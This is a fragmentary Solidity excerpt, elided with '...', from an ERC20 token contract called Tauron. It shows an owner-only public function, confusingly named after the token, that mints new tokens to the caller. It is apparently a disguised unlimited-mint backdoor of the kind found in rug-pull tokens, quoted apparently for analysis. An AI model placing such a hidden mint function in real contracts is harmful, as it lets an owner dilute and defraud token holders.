...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function Tauron(uint256 amount) public onlyOwner {
    Tauron(msg.sender, amount);
    }
    ...
    function Tauron(address account, uint256 amount) internal virtual {
...
contract Tauron is ERC20 {

    uint tokenTotalSupply = 1000000000;

    constructor() public ERC20("Tauron", "TARN") {
        Tauron(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}